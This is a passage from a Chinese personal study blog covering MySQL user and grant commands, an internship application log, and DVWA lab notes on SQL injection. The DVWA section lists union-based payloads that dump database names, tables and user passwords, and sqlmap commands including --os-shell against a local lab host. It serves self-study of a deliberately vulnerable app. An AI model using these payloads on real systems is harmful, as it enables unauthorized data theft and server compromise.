class="keyword">constraint</span> fk_boy <span class="keyword">foreign</span> key boy_girl(boy_id) referencecs boy(id)</span><br><span class="line">    <span class="keyword">constraint</span> fk_girl <span class="keyword">foreign</span> key boy_girl(girl_id) <span class="keyword">references</span> girl(id)</span><br><span class="line">)<span class="keyword">default</span> charset<span class="operator">=</span>utf8</span><br></pre></td></tr></table></figure>

<h2 id="用户授权"><a href="#用户授权" class="headerlink" title="用户授权"></a>用户授权</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> databases;</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>, authentication_string, host <span class="keyword">from</span> mysql.user</span><br><span class="line"><span class="keyword">desc</span> mysql.user</span><br><span class="line">use mysql;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1652514336912.png" alt="1652514336912"></p>
<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1652514299347.png" alt="1652514299347"></p>
<p><img src="C:\Users\hyy\Desktop\编程语言.assets\1652514169661.png"></p>
<h3 id="创建删除用户"><a href="#创建删除用户" class="headerlink" title="创建删除用户"></a>创建删除用户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">create user &#x27;用户名&#x27;@&#x27;连接者的ip地址&#x27; identified by &#x27;密码&#x27;</span><br><span class="line">e.g.</span><br><span class="line">create user hyy1996@127.0.0.1 identified by &#x27;hyy1996&#x27;</span><br><span class="line">create user hyy1990@&#x27;127.0.0.%&#x27; identified by &#x27;hyy1990&#x27;</span><br><span class="line">create user hyy1000@&#x27;%&#x27; identified by &#x27;hyy1000&#x27;		#随便哪个</span><br></pre></td></tr></table></figure>

<h3 id="修改用户"><a href="#修改用户" class="headerlink" title="修改用户"></a>修改用户</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rename <span class="keyword">user</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span> <span class="keyword">to</span> <span class="string">&#x27;新用户名&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span></span><br></pre></td></tr></table></figure>

<h3 id="修改密码"><a href="#修改密码" class="headerlink" title="修改密码"></a>修改密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set password for &#x27;用户名&#x27;@&#x27;IP地址&#x27; = Password(&#x27;新密码&#x27;)</span><br></pre></td></tr></table></figure>

<h3 id="授权管理"><a href="#授权管理" class="headerlink" title="授权管理"></a>授权管理</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">grant</span> 权限 <span class="keyword">on</span> 数据库.表 <span class="keyword">to</span> <span class="string">&#x27;用户&#x27;</span>@<span class="string">&#x27;IP地址&#x27;</span></span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">to</span> <span class="string">&#x27;hyy19&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>#用户hyy19所有数据库权限</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> privileges <span class="keyword">on</span> day26.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;hyy19&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>#数据库day26的权限</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">select</span>, inser <span class="keyword">on</span> day26db.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;hyy19&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span></span><br></pre></td></tr></table></figure>




      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/" data-id="cljpcwhu10009l8ez8lpcgelh" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-实习投递" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.680Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h3 id="第一段实习"><a href="#第一段实习" class="headerlink" title="第一段实习"></a>第一段实习</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">23.2.16</span><br><span class="line">甲方 国脉文化 新国脉数字文化股份有限公司 中国电信旗下的上市公司</span><br><span class="line">1.安全网络的建设</span><br><span class="line">2.根据漏洞编写poc利用脚本</span><br><span class="line">3.还有一个忘了</span><br><span class="line">可以接触到市面上所有能看到的安全设备</span><br><span class="line">40分钟左右单程 8小时 80块+午餐	3天每周</span><br><span class="line"></span><br><span class="line">23.2.17</span><br><span class="line">安恒信息</span><br><span class="line">有渗透测试 但是要看能力</span><br><span class="line">电话面试很多答不上来</span><br><span class="line">1.xml xxe漏洞?</span><br><span class="line">2.ctf src经历 无</span><br><span class="line">一月4000左右	5天每周</span><br></pre></td></tr></table></figure>

<h3 id="第二段实习"><a href="#第二段实习" class="headerlink" title="第二段实习"></a>第二段实习</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.nowcoder.com/discuss/439515735082266624</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">阿里 3.8投		简历挂</span><br><span class="line">https://talent.alibaba.com/personal/campus-application?lang=zh</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">腾讯 广州 深圳	3.4投 3.6之前做测评	3.26笔试 40不定项 2简答 1编程0.09</span><br><span class="line">技术工程事业群TEG</span><br><span class="line">	https://join.qq.com/post.html?query=p_2&amp;keyword=%E5%AE%89%E5%85%A8</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">百度	成都		3.4投		3.13笔试</span><br><span class="line">	https://talent.baidu.com/jobs/social-center</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">拼多多	上海	3.4投	3.12笔试 2.15/4 		4.12面试挂了</span><br><span class="line">https://careers.pinduoduo.com/campus/grad?t=Pb54NLa9e2</span><br><span class="line">https://careers.pinduoduo.com/campus/personal-center</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">美团	春季校招投错了... 日常实习也投不了			3.4投		3.11笔试 1/5</span><br><span class="line">https://zhaopin.meituan.com/web/personalCenter/deliveryRecord</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">华为  网络安全实习生 非暑期 北京 东莞 成都		3.10投</span><br><span class="line">https://career.huawei.com/reccampportal/portal5/user-index.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">小红书 上海 	3.17投	3.26笔试 20选择 1+0.18+0.82/3算法</span><br><span class="line">与灰产有关 日常	https://job.xiaohongshu.com/record/intern</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">云智研发公司		3.10投</span><br><span class="line">https://app-tc.mokahr.com/campus-recruitment/csig/20001#/job/abee9afa-6d7d-4cd7-9416-eec152fc8eba/campus_apply/thanks?jobId=abee9afa-6d7d-4cd7-9416-eec152fc8eba&amp;recommendCode=NTAAXBF&amp;codeType=1&amp;isRecommendation=undefined&amp;applyInfo%5BaimWorkCity%5D=%E6%AD%A6%E6%B1%89%E5%B8%82&amp;applyInfo%5BrecommendCode%5D=NTAAXBF&amp;candidateName=%E8%83%A1%E7%91%B6%E7%91%B6&amp;candidateId=5110762</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">中国电信 3.11投递 北京</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">蚂蚁 3.17投递		4.18一面 挂了</span><br><span class="line">https://talent.antgroup.com/personal/campus-application</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">联想 3.17投</span><br><span class="line">https://talent.lenovo.com.cn/account/apply</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">快手 3.20投	简历挂</span><br><span class="line">https://zhaopin.kuaishou.cn/recruit/e/#/official/my-apply/</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">实习安全厂商网址</span><br><span class="line">https://360campus.zhiye.com/jobs			#360</span><br><span class="line">https://qingteng.zhiye.com/Campus			#青藤云</span><br><span class="line">https://topsec.zhiye.com/intern/jobs		#天融信</span><br><span class="line">https://hr.sangfor.com/campucompon/schoolRecruitment/trainee	#深信服</span><br><span class="line">https://app.mokahr.com/campus_apply/chaitin/4562#/jobs?keyword=%E5%AE%89%E5%85%A8	#长亭</span><br><span class="line">https://jobs.bytedance.com/experienced/position		#字节</span><br><span class="line">https://campus.xiaopeng.com/#/		#小鹏汽车</span><br><span class="line">https://zp.dbappsecurity.com.cn/school	#安恒信息</span><br><span class="line">https://careers.oppo.com/campus/post/home		#oppo</span><br><span class="line">https://hr.vivo.com/wt/vivo/web/index/CompvivoAboutCampus		#vivo</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">微众银行	4.1投	4.1测评 没做笔试 4.23笔试没做</span><br><span class="line">https://app-tc.mokahr.com/campus-recruitment/webankhr/18005#/candidateHome/applications</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">SHEIN	4.1投 	4.4笔试	1志愿不匹配	4.23笔试</span><br><span class="line">https://app.mokahr.com/campus_apply/shein/2932#/candidateHome/applications</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">4.21 qax蓝初笔试74艹</span><br><span class="line">合合信息 4.23电话面试33分钟</span><br><span class="line">京东 4.23测评</span><br><span class="line">5.4 qax 第二次笔试52</span><br><span class="line">	南京齐同浩渺 靶机</span><br><span class="line">5.5 青藤云面试</span><br><span class="line">	二面hr面挂</span><br><span class="line"></span><br><span class="line">5.22 上班 矢安科技 220+20/day</span><br></pre></td></tr></table></figure>

<h3 id="提前批"><a href="#提前批" class="headerlink" title="提前批"></a>提前批</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">oppo</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\实习投递.assets\1688135114281.png" alt="1688135114281"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">用友</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\实习投递.assets\1688135152662.png" alt="1688135152662"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">滴滴 安全开发工程师</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\实习投递.assets\1688135176932.png" alt="1688135176932"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">天翼云 信息安全工程师</span><br></pre></td></tr></table></figure>

<p><img src="C:\Users\hyy\Desktop\实习投递.assets\1688135237229.png" alt="1688135237229"></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/07/05/%E5%AE%9E%E4%B9%A0%E6%8A%95%E9%80%92/" data-id="cljpcwhu00006l8ezatyw4187" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-dvwa" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2023/07/05/dvwa/" class="article-date">
  <time class="dt-published" datetime="2023-07-05T06:46:12.667Z" itemprop="datePublished">2023-07-05</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="SQL-Injection"><a href="#SQL-Injection" class="headerlink" title="SQL Injection"></a>SQL Injection</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">$<span class="keyword">result</span> <span class="operator">=</span> mysql_query($getid) <span class="keyword">or</span> die(<span class="string">&#x27;&lt;pre&gt;&#x27;</span>.mysql_error().<span class="operator">&lt;</span><span class="string">&#x27;/pre&#x27;</span><span class="operator">&gt;</span>);</span><br><span class="line">die()函数输出一条信息，并推出当前脚本</span><br><span class="line">mysql_error()函数返回上一个Mysql操作产生得到文本错误信息</span><br><span class="line"><span class="keyword">or</span>之前语句执行不成功事才会执行后面的语句</span><br><span class="line"><span class="keyword">and</span>之前语句执行成功事，才会执行后面的语句</span><br><span class="line"></span><br><span class="line">分为数字型和字符型</span><br><span class="line"><span class="keyword">select</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id<span class="operator">=</span>$id</span><br><span class="line"><span class="keyword">select</span> first_name, last_name <span class="keyword">FROM</span> users <span class="keyword">WHERE</span> user_id<span class="operator">=</span><span class="string">&#x27;$id&#x27;</span></span><br><span class="line">输入<span class="number">1</span><span class="operator">+</span><span class="number">2</span>看结果是<span class="number">1</span><span class="operator">+</span><span class="number">2</span>还是<span class="number">3</span></span><br><span class="line"></span><br><span class="line">对于字符型</span><br><span class="line"><span class="string">&#x27; or 1=1 or &#x27;</span>		假或真或假</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>		真或真</span><br><span class="line"><span class="string">&#x27; or 1=1#			假或真</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> <span class="comment">--			假或真</span></span><br><span class="line"></span><br><span class="line">如何防御<span class="keyword">sql</span>注入</span><br><span class="line">首要原则：用户的一切输入都是有害的，不被信任</span><br><span class="line">防御的主要方法：对用户输入的数据进行过滤</span><br><span class="line"></span><br><span class="line">利用sqlmap进行需要登录的输入		cookie</span><br></pre></td></tr></table></figure>

<h2 id="Low"><a href="#Low" class="headerlink" title="Low"></a>Low</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">	mysql注释符 -- （后面有空格）或者#单行注释 本例多行注释</span></span><br><span class="line"><span class="comment">	php注释符	# //单行</span></span><br><span class="line"><span class="comment">	一定要用#？？</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">--判断闭合点</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; and 1=1						-- 单引号闭合</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span> #					<span class="comment">-- 注释掉后面的部分	查用户1</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; or 1=1 #						-- 显示所有用户5个where恒成立</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span>#					<span class="comment">-- 三列报错说名只有2个字段,返回结果2个</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 1,2#			-- 回显，说明执行的sql语句为select Firstname,Surname from table where id= &#x27;</span>id<span class="string">&#x27;	应该是说返回值要有2个</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database()#	<span class="comment">-- 获取当前数据库==》dvwa</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select version(), 2#	-- 获取版本</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="built_in">session_user</span>(), <span class="number">2</span>#	<span class="comment">-- 连接用户</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select @@version_compile_os,@@basedir# -- 操作系统 安装路径</span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, schema_name <span class="keyword">from</span> information_schema.schemata#		<span class="comment">-- 查询有哪些数据库</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">查询dvwa有哪些表</span></span><br><span class="line"><span class="comment">有报错Illegal mix of collations for operation &#x27;UNION&#x27;</span></span><br><span class="line"><span class="comment">原因是两端类型不同https://blog.csdn.net/qq_43665434/article/details/114088565</span></span><br><span class="line"><span class="comment">需要修改类型</span></span><br><span class="line"><span class="comment">alter table users modify first_name varchar(15) character set utf8 collate utf8_general_ci</span></span><br><span class="line"><span class="comment">alter table users modify last_name varchar(15) character set utf8 collate utf8_general_ci</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select 2,table_name from information_schema.tables where table_schema=&#x27;</span>dvwa<span class="string">&#x27;#</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> column_name,<span class="number">2</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span>#			<span class="comment">-- 查字段	此处最好加上数据集名，可能存在多个数据库都有users的可能性</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users modify <span class="keyword">user</span> <span class="type">varchar</span>(<span class="number">15</span>) <span class="type">character</span> <span class="keyword">set</span> utf8 <span class="keyword">collate</span> utf8_general_ci</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">table</span> users modify password <span class="type">varchar</span>(<span class="number">15</span>) <span class="type">character</span> <span class="keyword">set</span> utf8 <span class="keyword">collate</span> utf8_general_ci</span><br><span class="line"><span class="number">1</span><span class="string">&#x27; union select user,password from dvwa.users#</span></span><br><span class="line"><span class="string">alter table users modify first_name varchar(15) character set utf8 collate utf8_unicode_ci</span></span><br><span class="line"><span class="string">alter table users modify last_name varchar(15) character set utf8 collate utf8_unicode_ci</span></span><br><span class="line"><span class="string">-- 这里要改成Unicode编码</span></span><br></pre></td></tr></table></figure>

<h2 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h2><p>会检测输入不能有特殊符号，比如</p>
<p><img src="C:\Users\hyy\Desktop\dvwa.assets\1652614062263.png" alt="1652614062263"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">id=3 or 1=1						#查闭合点</span><br><span class="line">id=3 order by 3#					-- 三列报错说名只有2个字段,返回结果2个</span><br><span class="line">id=3 union select 1,2#			-- 回显，说明执行的sql语句为select Firstname,Surname from table where id= &#x27;id&#x27;	应该是说返回值要有2个</span><br><span class="line">id=3 union select 1, database()#	-- 获取当前数据库==》dvwa</span><br><span class="line">id=3 union select version(), 2#	-- 获取版本</span><br><span class="line">id=3 union select session_user(), 2#	-- 连接用户</span><br><span class="line">id=3 union select @@version_compile_os,@@basedir# -- 操作系统 安装路径</span><br><span class="line"></span><br><span class="line">-- 查询有哪些数据库		Illegal mix of collations for operation &#x27;UNION&#x27;</span><br><span class="line">id=3 union select 1, schema_name from information_schema.schemata#</span><br><span class="line"></span><br><span class="line">-- 查dvwa库有哪些表			这是单引号的问题</span><br><span class="line">id=5 union select 2,table_name from information_schema.tables where table_schema=&quot;dvwa&quot;#</span><br><span class="line">-- 查dvwa库有哪些表	Illegal mix of collations for operation &#x27;UNION&#x27;</span><br><span class="line">id=5 union select 2,table_name from information_schema.tables where table_schema=database()#</span><br><span class="line">-- 此处将first_name,last_name改回utf8_general_ci可以查询</span><br><span class="line"></span><br><span class="line">-- 查users表有哪些字段				这个不对不能有引号</span><br><span class="line">id=5 union select column_name,2 from information_schema.columns where table_name=&#x27;users&#x27;#</span><br><span class="line">-- 查users表有哪些字段		小葵花转换工具转成hex		Illegal mix of collations for operation &#x27;UNION&#x27;</span><br><span class="line">id=5 union select column_name,2 from information_schema.columns where table_name=0x7573657273#</span><br><span class="line">-- 此处将first_name,last_name改回utf8_general_ci可以查询</span><br><span class="line"></span><br><span class="line"># 查密码		此处需要将first_name,last_name改回utf8_unicode_ci</span><br><span class="line">id=5 union select user,password from dvwa.users#</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="High"><a href="#High" class="headerlink" title="High"></a>High</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">弹框同Low级别输入</span><br></pre></td></tr></table></figure>

<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><p>看源码只能输入数字，不可能产生注入</p>
<h1 id="SQLmap工具注入"><a href="#SQLmap工具注入" class="headerlink" title="SQLmap工具注入"></a>SQLmap工具注入</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">bp抓包抓不了127.0.0.1抓192.168.88.1这个是host-only分配的地址</span><br><span class="line">可以获取cookie也可以f12控制台document.cookie</span><br><span class="line"></span><br><span class="line">#	get请求注入</span><br><span class="line">#	-u后面双引号网址网址 --cookie=&quot;提交参数的网址（get请求）&quot;</span><br><span class="line">sqlmap.py -u &quot;http://192.168.88.1/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=qboo64r71thl7fa5c0qk73cph5; security=low&quot;</span><br><span class="line">#	得到数据库类型和版本	服务器系统类型	php版本 apache版本</span><br><span class="line"></span><br><span class="line">#	加--dbs得到所有数据库的名字</span><br><span class="line"></span><br><span class="line">#	post请求注入</span><br><span class="line">#	方法1		加上--forms</span><br><span class="line">sqlmap.py -u &quot;http://192.168.88.1/login.html&quot; --forms</span><br><span class="line">#	方法2		-r参数拦截加载的数据包信息放进sqlmap所在目录.txt文件 </span><br><span class="line">sqlmap.py -r &quot;search-test.txt&quot; -p &quot;username&quot;	#-p	重点检测username参数是否可注入</span><br><span class="line">#	方法3		利用os-shell参数获取shell</span><br><span class="line">1.网站必须是MSSQL或MySQL不可用于ACCSEE</span><br><span class="line">2.当前用户必须具有数据库管理员操作权限</span><br><span class="line">3.需要知道具体的文件路径</span><br><span class="line">#这里只有low级别可以实现</span><br><span class="line">首先检测出是不是注入点，然后加上--os-shell</span><br><span class="line">选择4（PHP）</span><br><span class="line">然后输入主目录路径D:\phpStudy\WWW\dvwa</span><br><span class="line">获取os-shell</span><br><span class="line">这个方法条件苛刻</span><br></pre></td></tr></table></figure>

<h1 id="搭建PHP加SQL-Server的Web环境"><a href="#搭建PHP加SQL-Server的Web环境" class="headerlink" title="搭建PHP加SQL Server的Web环境"></a>搭建PHP加SQL Server的Web环境</h1><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Di4y1u7s6?p=7&vd_source=d5448e640adeda715972607248810967">https://www.bilibili.com/video/BV1Di4y1u7s6?p=7&amp;vd_source=d5448e640adeda715972607248810967</a></p>
<h2 id="SQL-Server的注入特性"><a href="#SQL-Server的注入特性" class="headerlink" title="SQL Server的注入特性"></a>SQL Server的注入特性</h2><p><a target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV1Di4y1u7s6?p=8&vd_source=d5448e640adeda715972607248810967">https://www.bilibili.com/video/BV1Di4y1u7s6?p=8&amp;vd_source=d5448e640adeda715972607248810967</a></p>
<h1 id="SQL-Injection-Blind"><a href="#SQL-Injection-Blind" class="headerlink" title="SQL Injection(Blind)"></a>SQL Injection(Blind)</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">函数前加@符号，可以抑制报错信息</span><br></pre></td></tr></table></figure>

<h2 id="Low-1"><a href="#Low-1" class="headerlink" title="Low"></a>Low</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">limit从<span class="number">0</span>开始</span><br><span class="line">substr从<span class="number">1</span>开始</span><br></pre></td></tr></table></figure>

